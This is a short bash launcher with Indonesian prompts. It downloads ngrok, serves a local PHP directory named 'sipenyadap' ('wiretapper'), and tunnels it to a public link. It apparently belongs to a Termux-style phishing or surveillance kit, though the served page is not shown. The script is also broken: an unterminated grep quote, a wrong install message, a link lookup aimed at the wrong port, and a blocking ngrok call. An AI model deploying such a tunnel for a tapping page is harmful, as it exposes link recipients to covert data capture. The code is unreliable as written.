#!/bin/bash

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "Mohon install php"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Mohon install wget."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Mendownload Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-amd64.zip ]]; then
unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-amd64.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Memulai php server...\n"
php -S 127.0.0.1:3333 -t sipenyadap > /dev/null 2>&1 & 
sleep 2
echo { mengaktifkan ngrok }
read -p "masukkan ngrok authtoken mu!" token;
./ngrok authtoken $token
./ngrok http 127.0.0.1:3333
link=$(curl -s -N http://127.0.0.1:3333/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io>
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
